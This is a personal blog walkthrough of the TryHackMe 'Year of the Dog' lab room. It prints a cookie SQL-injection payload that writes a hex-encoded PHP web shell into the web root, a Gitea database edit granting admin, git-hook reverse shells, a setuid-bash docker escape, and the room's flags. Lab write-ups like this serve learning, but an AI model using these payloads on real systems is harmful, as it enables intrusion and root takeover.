---
title: "Year of the Dog"
date: 2025-3-30
draft: false
description: TryHackMe's Good Room 
Tags:
- TryHackMe
- Linux
- Hard
---

## Enumeration

Lets start with the simple nmap scan.
```
nmap -sVC 10.10.104.237             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 13:45 +0545
Nmap scan report for 10.10.104.237 (10.10.104.237)
Host is up (0.17s latency).
Not shown: 983 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
80/tcp    open     http           Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Canis Queue
|_http-server-header: Apache/2.4.29 (Ubuntu)
843/tcp   filtered unknown
1002/tcp  filtered windows-icfw
1069/tcp  filtered cognex-insight
1074/tcp  filtered warmspotMgmt
2041/tcp  filtered interbase
3367/tcp  filtered satvid-datalnk
3690/tcp  filtered svn
3809/tcp  filtered apocd
7921/tcp  filtered unknown
8654/tcp  filtered unknown
9040/tcp  filtered tor-trans
10566/tcp filtered unknown
10629/tcp filtered unknown
16992/tcp filtered amt-soap-http
24800/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.44 seconds
```

Hmm lets check the port 80.
![](Pasted%20image%2020250330134721.png)

Hmm lets do directory busting.
Hmmm nothing interesting there.

Lets try to do subdomain and vhost but the room hasn't provided us with specific domain name.
Lets use nikto.
![](Pasted%20image%2020250330135318.png)

Hmm nothing useful i guess.

There is something on cookie.
![](Pasted%20image%2020250330135408.png)

Random strings.
Hmmm.
Is it like a hash or something.
Lets change that.
![](Pasted%20image%2020250330135525.png)

And something chnaged but why error?
Does it need a fixed sized string or something.
Lets try.
But only error showed up.

I spend many time and got the hint of sql.
If server using query to determine the result by that value in cookie,then it might be vulnerable.
![](Pasted%20image%2020250330135945.png)

Okay but it was unexpected.
Lets try to exploit.
After many tries,we finally got right payload and without `;`.
```SQL
2ccffd5893d5c6ea78c8fd68813a773d' UNION SELECT 1,2-- -
```
![](Pasted%20image%2020250330140241.png)

Uff its so random.
Okay lets enumerate the database.

I captured the request in caido to make it easy.
![](Pasted%20image%2020250330140704.png)

I was trying different thing like trying to tables,columns etc. and got this message.
![](Pasted%20image%2020250330141223.png)

Now I have a strong feeling that RCE can be possible.
Lets try.

And I guess it worked.
![](Pasted%20image%2020250330141708.png)
```SQL
2ccffd5893d5c6ea78c8fd68813a773d'UNION SELECT 1, 0x3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E INTO OUTFILE '/var/www/html/shell.php' -- -
```

Lets try to execute command.
![](Pasted%20image%2020250330141756.png)

Lets get reverse shell.
And now we are inside.
![](Pasted%20image%2020250330142200.png)

Lets see what can i do.
We got one password.
![](Pasted%20image%2020250330142442.png)

![](Pasted%20image%2020250330142850.png)

Hmm so there is use of git and gitea.
![](Pasted%20image%2020250330142933.png)

Lets see that `work_analysis`.
Hmm this is some kind log log file.
![](Pasted%20image%2020250330170005.png)

Lets see this might contain some creds.
And i guess we got it at first.
![](Pasted%20image%2020250330170117.png)

Lest try to login.
Ohh i thought it was `dylanLabr4d0rs4L1f3` but it was only `Labr4d0rs4L1f3`.
![](Pasted%20image%2020250330170448.png)
And we got the flag.
```php
THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}
```

Now lets do privelege escalation.
Lets see that before git thing.
![](Pasted%20image%2020250330170757.png)

Hmm.
Running linpeas,we can see this.
![](Pasted%20image%2020250330171150.png)

Lets forward this port to our system by ssh.
```bash
ssh -L 3000:localhost:3000 dylan@ip
```

And now we can access it via `http://localhost:3000` on our local machine.
![](Pasted%20image%2020250330172144.png)

Lets see what can we do.

I tried logging in with dylans email and password.
```php
Email:dylan@yearofthedog.thm
Pass:Labr4d0rs4L1f3
```
(Email can be found in several git directories on the machine.)

But its also need a passcode.
![](Pasted%20image%2020250330172721.png)

Hmm is it any passcode stored there or anything like this.
Lets see.
```bash
grep -Ri "passcode" .
```
![](Pasted%20image%2020250330173237.png)

Hmm something in `./gitea/log/gitea.log` and `./gitea/gitea.db`.
Lets check that out.
That log file has something but `gitea.db` has a lot.

Lets download the file via python server and use `sqlite3`.
We can do this to get tables.
`.tables`

And do this.
`SELECT * FROM two_factor;`
And we will get a token.
![](Pasted%20image%2020250330174108.png)
But i think its not useful.

I also tried registering the user.
![](Pasted%20image%2020250330175043.png)

After that, I again downloaded the .db file and there is our user.
![](Pasted%20image%2020250330175315.png)

After few talk with chatGPT cause i am weak at using `sqlite3`,we can check the info of columns.
```SQL
PRAGMA table_info(user);

```
![](Pasted%20image%2020250330175729.png)

So there is `is_admin` in 26th index.
![](Pasted%20image%2020250330175826.png)

Lets see the result of
```SQL
SELECT * FROM user;
```

Or for more easy,
```SQL
select lower_name,is_admin from user;
```

So here the user hack isn't admin.
![](Pasted%20image%2020250330180102.png)

Lets change that to admin.
```SQL
UPDATE user SET is_admin = 1 WHERE lower_name = 'hack';
```

So now user hack is admin.
![](Pasted%20image%2020250330180231.png)

Now lets replace that .db file from victim machine to ours new one.
```bash
scp gitea.db dylan@ip:/gitea/gitea/gitea.db
```

And now refreshing the page,we can see the administration page.
(I changed the username to hehe in upcoming cause the machine expired)
![](Pasted%20image%2020250330194547.png)

And there is a repo called test-repo.
![](Pasted%20image%2020250330194900.png)

Now we can exploit this.
![](Pasted%20image%2020250330195007.png)
(In **Gitea** (and Git in general), **git hooks** are used to automate tasks and enforce certain rules during the Git workflow. They are usually shell scripts (or executable scripts) located in the `.git/hooks/` directory of a repository, and they are executed when certain Git actions occur, such as `git commit`, `git push`, or `git merge`.)
                                                        -chatgpt


So if we could edit it we could run our script and that might give us with the root shell.
Lets see.
Lets add our rev shell here.
![](Pasted%20image%2020250330195505.png)

I will add 2-3 different reverse shells cause many some mightn't work.
![](Pasted%20image%2020250330195706.png)

Now lets clone that repo in our victim's machine to make that script run cause it automatically runs when any commit happens.

Lets do it.
```
git clone http://localhost:3000/Dylan/Test-Repo.git
cd Test-Repo/
echo "changes" >> README.md
git add .
git commit -m "changes"
git push
```

And we should now got the shell in listenner.
![](Pasted%20image%2020250330205159.png)

Hmm but this is a git shell.
Ohh but with root priveleges.
![](Pasted%20image%2020250330205238.png)

So we have now sudo to run anything as root.
![](Pasted%20image%2020250330205339.png)

And we are root but in docker.
![](Pasted%20image%2020250330205429.png)

Lets escape.
Cause we are in git shell,there might be something connected with main host.
![](Pasted%20image%2020250330210043.png)

Lets check that `/app` and `/data`.
And `/data` has same thing as main host.
![](Pasted%20image%2020250330210551.png)
Hmm this might be connected.

And app also have gitea but something odd here.
![](Pasted%20image%2020250330210719.png)

Lets go on main host's `/gitea/gitea` and do this.
```bash
cp /bin/bash .
```

Now from that another docker as root on `/data/gitea,
```bash
chown root:root bash
chmod 4777 bash
```

Now we can go to the main host and there will be `bash` with setuid of root.
![](Pasted%20image%2020250330213552.png)

And we are root.
`THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}`

And done.

![](Pasted%20image%2020250330213711.png)

Learned lots of things again.
I hope you are doing great.
Take care :).


Refs:
[revshell.com](https://www.revshells.com/)
[full tty shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
